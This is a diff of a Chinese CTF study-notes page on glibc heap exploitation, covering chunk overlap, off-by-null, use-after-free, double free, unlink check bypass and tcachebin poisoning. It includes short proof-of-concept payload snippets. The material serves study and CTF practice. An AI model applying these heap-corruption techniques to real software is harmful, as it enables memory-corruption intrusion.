 </blockquote>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载对应 libc 包</span></span><br><span class="line">./download xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制 /libs/2.xx-xubuntuxx_xxx/.debug/.build-id 的绝对路径，在gdb时</span></span><br><span class="line">loadfolder /path/to/libs/2.xx-xubuntuxx_xxx/.debug/.build-id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果 download 拉不下来，去对应网站找带dbg（如libc6-dbg_2.23-0ubuntu3_i386.deb）的包下载下来，将/data/usr/lib/debug/.build-id复制到 /libs/2.xx-xubuntuxx_xxx/.debug 下即可</span></span><br></pre></td></tr></table></figure>
-<h3 id="1-4-2-list-中没有相关包"><a href="#1-4-2-list-中没有相关包" class="headerlink" title="[1-4-2] list 中没有相关包"></a>[1-4-2] list 中没有相关包</h3><p>查看<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1a966b62b3d4">这个教程</a>编译源码来恢复符号</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/17822138.html">docker 恢复符号</a></p>
-<h2 id="1-5-恢复源码-与patchelf关系不大"><a href="#1-5-恢复源码-与patchelf关系不大" class="headerlink" title="[1-5] 恢复源码(与patchelf关系不大)"></a>[1-5] 恢复源码(与patchelf关系不大)</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/65873040">看这篇</a></p>
-<h1 id="2-详解-‘申请与释放-chunk’-未完成"><a href="#2-详解-‘申请与释放-chunk’-未完成" class="headerlink" title="[2] 详解 ‘申请与释放 chunk’(未完成)"></a>[2] 详解 ‘申请与释放 chunk’(未完成)</h1><h2 id="2-1-申请-chunk"><a href="#2-1-申请-chunk" class="headerlink" title="[2-1] 申请 chunk"></a>[2-1] 申请 chunk</h2><ol>
-<li><p>如果是第一次申请，则 malloc 一块内存来存放 <code>tcache_perthread_struct</code></p>
-</li>
-<li><p>查看要申请的 chunk 的大小，记作 <code>SIZE</code></p>
-</li>
-<li><p>检查各种 bin  </p>
-<ol>
-<li>(libc2.26及之后) <code>SIZE</code> 属于 [0x0,small bin size)，检查 tcachebin，有合适的 chunk 则返回</li>
-<li>根据版本有不同选择  <ol>
-<li>(libc2.26之前)<code>SIZE</code> 属于 [0x0,0x78]，检查 fastbins，有合适的 chunk 则检查 size 域是否正确，正确则返回</li>
-<li>(libc2.26及之后)<code>SIZE</code> 属于 [0x0,0x78]，将对应 fastbin 一整条链挪进 tcachebin 的对应链上，并取出 newest_chunk 返回</li>
-</ol>
-</li>
+<h3 id="list-中没有相关包">[1-4-2] list 中没有相关包</h3>
+<p>查看<a
+target="_blank" rel="noopener" href="https://www.jianshu.com/p/1a966b62b3d4">这个教程</a>编译源码来恢复符号</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/17822138.html">docker
+恢复符号</a></p>
+<h2 id="恢复源码与patchelf关系不大">[1-5]
+恢复源码(与patchelf关系不大)</h2>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/65873040">看这篇</a></p>
+<h1 id="详解-申请与释放-chunk未完成">[2] 详解 '申请与释放
+chunk'(未完成)</h1>
+<h2 id="申请-chunk">[2-1] 申请 chunk</h2>
+<ol start="0" type="1">
+<li><p>如果是第一次申请，则 malloc 一块内存来存放
+<code>tcache_perthread_struct</code></p></li>
+<li><p>查看要申请的 chunk 的大小，记作 <code>SIZE</code></p></li>
+<li><p>检查各种 bin</p>
+<ol type="1">
+<li>(libc2.26及之后) <code>SIZE</code> 属于 [0x0,small bin size)，检查
+tcachebin，有合适的 chunk 则返回</li>
+<li>根据版本有不同选择
+<ol type="1">
+<li>(libc2.26之前)<code>SIZE</code> 属于 [0x0,0x78]，检查
+fastbins，有合适的 chunk 则检查 size 域是否正确，正确则返回</li>
+<li>(libc2.26及之后)<code>SIZE</code> 属于 [0x0,0x78]，将对应 fastbin
+一整条链挪进 tcachebin 的对应链上，并取出 newest_chunk 返回</li>
+</ol></li>
 <li>smallBin largeBin 还没学</li>
-<li>检查 unsortedBin，如果 <code>SIZE</code> 小于 “unsortedbin 的某个 chunk 的 size”，则:<ol>
-<li>以0x10为基本单位切割出申请的 chunk 并返回，剩下的部分叫做 last remainder chunk</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>检查 topchunk，如果 <code>SIZE</code> 小于 “topchunk 的 size”，则:<ol>
+<li>检查 unsortedBin，如果 <code>SIZE</code> 小于 "unsortedbin 的某个
+chunk 的 size"，则:
+<ol type="1">
+<li>以0x10为基本单位切割出申请的 chunk 并返回，剩下的部分叫做 last
+remainder chunk</li>
+</ol></li>
+</ol></li>
+<li><p>检查 topchunk，如果 <code>SIZE</code> 小于 "topchunk 的
+size"，则:</p>
+<ol type="1">
 <li>以0x10为基本单位切割出申请的 chunk 并返回</li>
+</ol></li>
+<li><p>用 Brk 再拉几页内存出来，还没学</p></li>
 </ol>
-</li>
-<li>用 Brk 再拉几页内存出来，还没学</li>
-</ol>
-<h2 id="2-2-释放-chunk"><a href="#2-2-释放-chunk" class="headerlink" title="[2-2] 释放 chunk"></a>[2-2] 释放 chunk</h2><ol>
+<h2 id="释放-chunk">[2-2] 释放 chunk</h2>
+<ol type="1">
 <li>查看要释放的 chunk 的大小，记作<code>SIZE</code></li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 猜测，尚不确定</span><br><span class="line">n. 检查 prev_inuse 位，若为0，则:  </span><br><span class="line">    1. 如果 chunk 不在 fastbin/tcachebin，则前向合并，并继续递归检验 prev_inuse</span><br><span class="line">    2. 如果 chunk 在 fastbin/tcachebin，则获取前一个 chunk 的 size，并存到 prev_size 域</span><br></pre></td></tr></table></figure>
-<h1 id="3-chunk-Extend-and-Overlapping"><a href="#3-chunk-Extend-and-Overlapping" class="headerlink" title="[3] chunk Extend and Overlapping"></a>[3] chunk Extend and Overlapping</h1><h2 id="3-1-分类"><a href="#3-1-分类" class="headerlink" title="[3-1] 分类"></a>[3-1] 分类</h2><p>本质是通过修改 chunk_header 来实现用 chunk1 控制 chunk2 的内容的效果。分为前向和后向两种</p>
-<h3 id="3-1-1-后向-Overlap"><a href="#3-1-1-后向-Overlap" class="headerlink" title="[3-1-1] 后向 Overlap"></a>[3-1-1] 后向 Overlap</h3><p>堆区模型：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---chunk1(0x21)---</span><br><span class="line">---chunk2(0x21)---</span><br></pre></td></tr></table></figure></p>
-<p>本质：修改低地址 chunk1 的 size 域，在修改 chunk1 内容时会越界修改掉 chunk2 的内容</p>
-<h3 id="3-1-2-前向-Overlap"><a href="#3-1-2-前向-Overlap" class="headerlink" title="[3-1-2] 前向 Overlap"></a>[3-1-2] 前向 Overlap</h3><p>堆区模型：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---chunk1(0x81)---</span><br><span class="line">---chunk2(0x21)---</span><br><span class="line">---chunk3(0x21)---</span><br><span class="line">---chunk4(0x81)---</span><br><span class="line">---chunk5(0x21)---防止 top_chunk 合并</span><br></pre></td></tr></table></figure></p>
-<p>本质：修改高地址 chunk4 的 pre_inuse 域和 prev_size 域，通过 free 时 bins 的机制来进行前向合并 chunk1 ，从而再次 malloc 时可以控制中间的 chunk2 与 chunk3</p>
-<h2 id="3-2-具体利用手法"><a href="#3-2-具体利用手法" class="headerlink" title="[3-2] 具体利用手法"></a>[3-2] 具体利用手法</h2><h3 id="3-2-1-off-by-null"><a href="#3-2-1-off-by-null" class="headerlink" title="[3-2-1] off-by-null"></a>[3-2-1] off-by-null</h3><h4 id="3-2-1-1-概述"><a href="#3-2-1-1-概述" class="headerlink" title="[3-2-1-1] 概述"></a>[3-2-1-1] 概述</h4><p><code>off-by-null</code> 指的是程序在写入堆的时候，会在输入字符的最后用<code>&#39;\x00&#39;</code>截断</p>
-<p>通过申请 xxx8h 大小的 chunk，当我们输入 xxx8 个字节时，程序会将下一个 chunk 的 size 域的低一个字节覆盖为0，</p>
-<p>这样的操作会让 prev_inuse 位置零，使程序误以为前一个 chunk 已经被释放，从而与前 n 个 chunk 发生合并</p>
-<h4 id="3-2-1-2-POC"><a href="#3-2-1-2-POC" class="headerlink" title="[3-2-1-2] POC"></a>[3-2-1-2] POC</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 0 0x91 </span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment"># 1 0x21</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 2 0x91</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 3 0x21 防止合并</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>) <span class="comment"># 0x20 + 0x90 = 0xb0</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># show(0) 可以 leak main_arena</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc(4,0xa0) 可以切割 chunk0-chunk2，从而修改 chunk1，</span></span><br><span class="line"><span class="comment"># 进而造成 tcachebin poisoning / fastbin attack</span></span><br></pre></td></tr></table></figure>
-<h1 id="4-Use-After-Free"><a href="#4-Use-After-Free" class="headerlink" title="[4] Use After Free"></a>[4] Use After Free</h1><h2 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="[4-1] 概述"></a>[4-1] 概述</h2><blockquote>
+<h1 id="chunk-extend-and-overlapping">[3] chunk Extend and
+Overlapping</h1>
+<h2 id="分类">[3-1] 分类</h2>
+<p>本质是通过修改 chunk_header 来实现用 chunk1 控制 chunk2
+的内容的效果。分为前向和后向两种</p>
+<h3 id="后向-overlap">[3-1-1] 后向 Overlap</h3>
+<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---chunk1(0x21)---</span><br><span class="line">---chunk2(0x21)---</span><br></pre></td></tr></table></figure></p>
+<p>本质：修改低地址 chunk1 的 size 域，在修改 chunk1 内容时会越界修改掉
+chunk2 的内容</p>
+<h3 id="前向-overlap">[3-1-2] 前向 Overlap</h3>
+<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---chunk1(0x81)---</span><br><span class="line">---chunk2(0x21)---</span><br><span class="line">---chunk3(0x21)---</span><br><span class="line">---chunk4(0x81)---</span><br><span class="line">---chunk5(0x21)---防止 top_chunk 合并</span><br></pre></td></tr></table></figure></p>
+<p>本质：修改高地址 chunk4 的 pre_inuse 域和 prev_size 域，通过 free 时
+bins 的机制来进行前向合并 chunk1 ，从而再次 malloc 时可以控制中间的
+chunk2 与 chunk3</p>
+<h2 id="具体利用手法">[3-2] 具体利用手法</h2>
+<h3 id="off-by-null">[3-2-1] off-by-null</h3>
+<h4 id="概述">[3-2-1-1] 概述</h4>
+<p><code>off-by-null</code>
+指的是程序在写入堆的时候，会在输入字符的最后用<code>'\x00'</code>截断</p>
+<p>通过申请 xxx8h 大小的 chunk，当我们输入 xxx8 个字节时，程序会将下一个
+chunk 的 size 域的低一个字节覆盖为0，</p>
+<p>这样的操作会让 prev_inuse 位置零，使程序误以为前一个 chunk
+已经被释放，从而与前 n 个 chunk 发生合并</p>
+<h4 id="poc">[3-2-1-2] POC</h4>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 0 0x91 </span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment"># 1 0x21</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 2 0x91</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 3 0x21 防止合并</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>) <span class="comment"># 0x20 + 0x90 = 0xb0</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># show(0) 可以 leak main_arena</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc(4,0xa0) 可以切割 chunk0-chunk2，从而修改 chunk1，</span></span><br><span class="line"><span class="comment"># 进而造成 tcachebin poisoning / fastbin attack</span></span><br></pre></td></tr></table></figure>
+<h1 id="use-after-free">[4] Use After Free</h1>
+<h2 id="概述-1">[4-1] 概述</h2>
+<blockquote>
 <p>libc2.26 - libc2.31，主要是 tcachebin UAF</p>
 </blockquote>
 <p>见 Kinds of Bin -&gt; Tcachebin -&gt; UAF</p>
-<h1 id="5-Double-Free"><a href="#5-Double-Free" class="headerlink" title="[5] Double Free"></a>[5] Double Free</h1><h2 id="5-1-概述"><a href="#5-1-概述" class="headerlink" title="[5-1] 概述"></a>[5-1] 概述</h2><blockquote>
+<h1 id="double-free">[5] Double Free</h1>
+<h2 id="概述-2">[5-1] 概述</h2>
+<blockquote>
 <p>libc2.27之前，主要是 fastbin double free</p>
 </blockquote>
 <p>见 Kinds of Bin -&gt; Fastbin</p>
 <blockquote>
 <p>libc2.27-2.28，主要是 tcachebin double free</p>
-<p>libc2.29-libc2.31，tcachebin加入了检查机制，所以仍然考虑用 fastbin/smallbin</p>
+</blockquote>
+<blockquote>
+<p>libc2.29-libc2.31，tcachebin加入了检查机制，所以仍然考虑用
+fastbin/smallbin</p>
 </blockquote>
 <p>见 Kinds of Bin -&gt; Tcachebin</p>
-<h1 id="6-Unlink"><a href="#6-Unlink" class="headerlink" title="[6] Unlink"></a>[6] Unlink</h1><h2 id="6-1-利用条件"><a href="#6-1-利用条件" class="headerlink" title="[6-1] 利用条件"></a>[6-1] 利用条件</h2><ol>
+<h1 id="unlink">[6] Unlink</h1>
+<h2 id="利用条件">[6-1] 利用条件</h2>
+<ol type="1">
 <li><p>free 的 <code>chunkC</code> 前后 chunk 的 fd/bk 可以被修改</p>
-<ol>
-<li><p>UAF，free 以后修改 fd/bk</p>
-</li>
-<li><p>堆溢出，伪造 chunk，修改 fd/bk 的同时修改 <code>chunk</code> 的 prev_size 和 prev_inuse</p>
-</li>
-</ol>
-</li>
+<ol type="1">
+<li><p>UAF，free 以后修改 fd/bk</p></li>
+<li><p>堆溢出，伪造 chunk，修改 fd/bk 的同时修改 <code>chunk</code> 的
+prev_size 和 prev_inuse</p></li>
+</ol></li>
 <li><p>没见过太多案例不太会概括这一点</p>
-<ol>
+<ol type="1">
 <li>pie 没开，bss 段的 heap_list 可以被拿来当做 fd/bk</li>
+</ol></li>
 </ol>
-</li>
+<h2 id="原理">[6-2] 原理</h2>
+<p>ctfwiki 上的 FD BK fd bk 感觉写的乱七八糟的，重新整理一下思路</p>
+<p>unlink 概括来讲，就是利用 free
+时的机制，实现任意地址写非任意值的技术</p>
+<h3 id="触发-unlink">[6-2-1] 触发 unlink</h3>
+<ol type="1">
+<li><p>在释放 size 大于 smallbin 最小值的 chunkC 时，ptmalloc 会检查
+chunkC 物理相邻的前后两个 chunk
+是否正在被使用，如果没被使用，则会触发前向/后向合并，从而触发 unlink</p>
+<ol type="1">
+<li><p>前向合并：chunkC 的 prev_size 为前一个 chunk 的 size，且 chunkC
+的 prev_inuse 位置零</p></li>
+<li><p>后向合并：chunkC 的后一个 chunk 已经在 binlist 当中</p></li>
+</ol></li>
 </ol>
-<h2 id="6-2-原理"><a href="#6-2-原理" class="headerlink" title="[6-2] 原理"></a>[6-2] 原理</h2><p>ctfwiki 上的 FD BK fd bk 感觉写的乱七八糟的，重新整理一下思路</p>
-<p>unlink 概括来讲，就是利用 free 时的机制，实现任意地址写非任意值的技术</p>
-<h3 id="6-2-1-触发-unlink"><a href="#6-2-1-触发-unlink" class="headerlink" title="[6-2-1] 触发 unlink"></a>[6-2-1] 触发 unlink</h3><ol>
-<li><p>在释放 size 大于 smallbin 最小值的 chunkC 时，ptmalloc 会检查 chunkC 物理相邻的前后两个 chunk 是否正在被使用，如果没被使用，则会触发前向/后向合并，从而触发 unlink</p>
-<ol>
-<li><p>前向合并：chunkC 的 prev_size 为前一个 chunk 的 size，且 chunkC 的 prev_inuse 位置零</p>
-</li>
-<li><p>后向合并：chunkC 的后一个 chunk 已经在 binlist 当中</p>
-</li>
-</ol>
-</li>
-</ol>
-<h3 id="6-2-2-古早版本"><a href="#6-2-2-古早版本" class="headerlink" title="[6-2-2] 古早版本"></a>[6-2-2] 古早版本</h3><p>假设在一个双向链表 bin 中，有 BK &lt;=&gt; CUR &lt;=&gt; FD</p>
+<h3 id="古早版本">[6-2-2] 古早版本</h3>
+<p>假设在一个双向链表 bin 中，有 BK &lt;=&gt; CUR &lt;=&gt; FD</p>
 <p>三个 chunk 的关系为</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BK.fd == &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk == &amp;(BK.prev_size)</span><br><span class="line">CUR.fd == &amp;(FD.prev_size)</span><br><span class="line">FD.bk == &amp;(CUR.prev_size)</span><br></pre></td></tr></table></figure>
 <center>
 <img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/figure/unlink_smallbin_intro.png" width=370 height=290 />
 </center>
-
-<p>在<strong>古早</strong>的版本中，unlink 的具体过程为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CUR.bk-&gt;fd = CUR.fd # CUR 的后一个 chunk 的 fd 指针指向 CUR 的前一个 chunk</span><br><span class="line">CUR.fd-&gt;bk = CUR.bk # CUR 的前一个 chunk 的 bk 指针指向 CUR 的后一个 chunk</span><br></pre></td></tr></table></figure></p>
-<p>如果我们修改 CUR 的 fd 和 bk 指针，就可以实现 <code>Any address write</code></p>
+<p>在<strong>古早</strong>的版本中，unlink 的具体过程为
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CUR.bk-&gt;fd = CUR.fd # CUR 的后一个 chunk 的 fd 指针指向 CUR 的前一个 chunk</span><br><span class="line">CUR.fd-&gt;bk = CUR.bk # CUR 的前一个 chunk 的 bk 指针指向 CUR 的后一个 chunk</span><br></pre></td></tr></table></figure></p>
+<p>如果我们修改 CUR 的 fd 和 bk 指针，就可以实现
+<code>Any address write</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SIZE 在32位为 4，64位为8</span></span><br><span class="line"><span class="comment">// target_addr + 0*SIZE = &amp;(fakechunk.prev_size)</span></span><br><span class="line"><span class="comment">// target_addr + 1*SIZE = &amp;(fakechunk.size)</span></span><br><span class="line"><span class="comment">// target_addr + 2*SIZE = &amp;(fakechunk.fd)</span></span><br><span class="line"><span class="comment">// target_addr + 3*SIZE = &amp;(fakechunk.bk)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 CUR 的 fd 和 bk 指针</span></span><br><span class="line">CUR.fd = target_addr - <span class="number">3</span>*SIZE</span><br><span class="line">CUR.bk = expect_value</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.fd-&gt;bk = CUR.bk</span></span><br><span class="line">*(target_addr - <span class="number">3</span>*SIZE + <span class="number">3</span>*SIZE) = expect_value + <span class="number">2</span>*SIZE</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.bk-&gt;fd = CUR.fd   ---&gt;   要求 expect_value + 8 指向的内存可写</span></span><br><span class="line">*(expect_value + <span class="number">2</span>*SIZE) = target_addr - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure>
-<h3 id="6-2-3-加入-check-以后"><a href="#6-2-3-加入-check-以后" class="headerlink" title="[6-2-3] 加入 check 以后"></a>[6-2-3] 加入 check 以后</h3><ol>
+<h3 id="加入-check-以后">[6-2-3] 加入 check 以后</h3>
+<ol type="1">
 <li><p>check1</p>
-<ol>
-<li><p>check</p>
- <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省流版: </span></span><br><span class="line"><span class="comment">// CUR 的 fd 指向的 chunk 的 bk 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="comment">// CUR 的 bk 指向的 chunk 的 fd 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="keyword">if</span> ( !( CUR.fd-&gt;bk == &amp;(CUR.prev_size) &amp;&amp; CUR.bk-&gt;fd == &amp;(CUR.prev_size) ) )</span><br><span class="line">    malloc_printerr(...)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>bypass</p>
- <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 让 CUR 的 fd 和 bk 指针都指向 CUR 自己</span></span><br><span class="line">CUR.fd = &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk = &amp;(CUR.prev_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">// check 时</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = CUR</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = CUR</span><br><span class="line"></span><br><span class="line"><span class="comment">// unlink</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = &amp;(CUR.prev_size) + <span class="number">2</span>*SIZE</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = &amp;(CUR.prev_size) - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure>
-<p> 这样虽然不能实现任意地址写，但是也可以让 CUR 的 fd 和 bk 指针指向不正确的位置</p>
-</li>
+<ol type="1">
+<li><p>check <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省流版: </span></span><br><span class="line"><span class="comment">// CUR 的 fd 指向的 chunk 的 bk 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="comment">// CUR 的 bk 指向的 chunk 的 fd 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="keyword">if</span> ( !( CUR.fd-&gt;bk == &amp;(CUR.prev_size) &amp;&amp; CUR.bk-&gt;fd == &amp;(CUR.prev_size) ) )</span><br><span class="line">    malloc_printerr(...)</span><br></pre></td></tr></table></figure></p></li>
+<li><p>bypass <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 让 CUR 的 fd 和 bk 指针都指向 CUR 自己</span></span><br><span class="line">CUR.fd = &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk = &amp;(CUR.prev_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">// check 时</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = CUR</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = CUR</span><br><span class="line"></span><br><span class="line"><span class="comment">// unlink</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = &amp;(CUR.prev_size) + <span class="number">2</span>*SIZE</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = &amp;(CUR.prev_size) - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure> 这样虽然不能实现任意地址写，但是也可以让
+CUR 的 fd 和 bk 指针指向不正确的位置</p></li>
+</ol></li>
 </ol>
-</li>
-</ol>
-<h1 id="7-Series-of-Bin"><a href="#7-Series-of-Bin" class="headerlink" title="[7] Series of Bin"></a>[7] Series of Bin</h1><h2 id="7-1-Tcachebin"><a href="#7-1-Tcachebin" class="headerlink" title="[7-1] Tcachebin"></a>[7-1] Tcachebin</h2><h3 id="7-1-1-概述"><a href="#7-1-1-概述" class="headerlink" title="[7-1-1] 概述"></a>[7-1-1] 概述</h3><ol>
+<h1 id="series-of-bin">[7] Series of Bin</h1>
+<h2 id="tcachebin">[7-1] Tcachebin</h2>
+<h3 id="概述-3">[7-1-1] 概述</h3>
+<ol type="1">
 <li>Tcachebin 为 LIFO 单向链表，如下</li>
 </ol>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Tcachebin</span>: (头节点)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">    ... -&gt; (尾节点)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
-<h3 id="7-1-2-Leak"><a href="#7-1-2-Leak" class="headerlink" title="[7-1-2] Leak"></a>[7-1-2] Leak</h3><h3 id="7-1-3-Write"><a href="#7-1-3-Write" class="headerlink" title="[7-1-3] Write"></a>[7-1-3] Write</h3><h4 id="7-1-3-1-UAF"><a href="#7-1-3-1-UAF" class="headerlink" title="[7-1-3-1] UAF"></a>[7-1-3-1] UAF</h4><blockquote>
+<h3 id="leak">[7-1-2] Leak</h3>
+<h3 id="write">[7-1-3] Write</h3>
+<h4 id="uaf">[7-1-3-1] UAF</h4>
+<blockquote>
 <p>Libc: 2.26 - 2.31</p>
+</blockquote>
+<blockquote>
 <p>应用条件:</p>
 </blockquote>
-<ol>
+<ol type="1">
 <li>UAF</li>
 </ol>
 <blockquote>
 <p>相关特性:</p>
 </blockquote>
-<ol>
-<li>Tcachebin 跟筛子没什么区别，通过 UAF 修改 newest_chunk 的 fd 指针为 Any address，再通过两次 malloc 就可以在 Any address 处申请到一个 chunk 供我们使用</li>
+<ol type="1">
+<li>Tcachebin 跟筛子没什么区别，通过 UAF 修改 newest_chunk 的 fd 指针为
+Any address，再通过两次 malloc 就可以在 Any address 处申请到一个 chunk
+供我们使用</li>
 </ol>
 <blockquote>
 <p>POC:</p>
 </blockquote>
